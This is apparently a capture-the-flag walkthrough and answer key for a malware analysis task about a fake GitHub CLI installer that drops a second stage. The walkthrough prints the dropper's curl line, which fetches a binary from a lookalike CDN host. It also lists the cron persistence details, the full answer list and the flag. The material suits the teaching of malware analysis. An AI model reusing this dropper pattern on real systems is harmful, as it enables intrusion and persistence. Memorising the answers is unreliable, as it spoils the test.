# Task 3 — The Dropper

Difficulty: Medium
Category: Malware Analysis
Flag: SecurinetsENIT{75efb0959defbc4b1bdcc6247381b437}

## Scenario

The user ran the installer from the downloaded archive with sudo. The
installer behaves as a dropper.

## Evidence

gh_2.42.1_linux_amd64.tar.gz

## Walkthrough

### Step 1 — Extract

    tar -xzf gh_2.42.1_linux_amd64.tar.gz
    ls gh_2.42.1_linux_amd64/

Two files: gh and install.sh

### Step 2 — Read the installer

    cat gh_2.42.1_linux_amd64/install.sh

The script does four things:

    1. Copies the fake gh binary to /usr/local/bin/
    2. Downloads a second-stage binary from a CDN URL
    3. Installs cron persistence
    4. Runs the binary in the background

### Step 3 — Find the flag

The fetch URL is built from variables:

    _REL="2.42.1"
    _BUILD="75efb0959defbc4b1bdcc6247381b437"
    _CDN="https://cdnjs-mirror.net/assets"
    _HELPER="gh-${_REL}-shell-helper.bin"

    curl -fsSL "${_CDN}/${_HELPER}?build=${_BUILD}" -o "$CACHE_DIR/gh-completion"

_BUILD is the flag.

## Interface

    nc <ctf-host> 9998

Answers:

    1.  gh-completion
    2.  curl
    3.  https://cdnjs-mirror.net/assets/gh-2.42.1-shell-helper.bin?build=75efb0959defbc4b1bdcc6247381b437
    4.  75efb0959defbc4b1bdcc6247381b437
    5.  build
    6.  ~/.local/share/gh-cli/gh-completion
    7.  cron
    8.  */30 * * * *
    9.  @reboot
    10. crontab
    11. nohup
    12. suppress errors

## Flag

SecurinetsENIT{75efb0959defbc4b1bdcc6247381b437}

## MITRE

T1059.004 — Command and Scripting Interpreter: Unix Shell
T1053.003 — Scheduled Task/Job: Cron
T1105 — Ingress Tool Transfer
T1036 — Masquerading
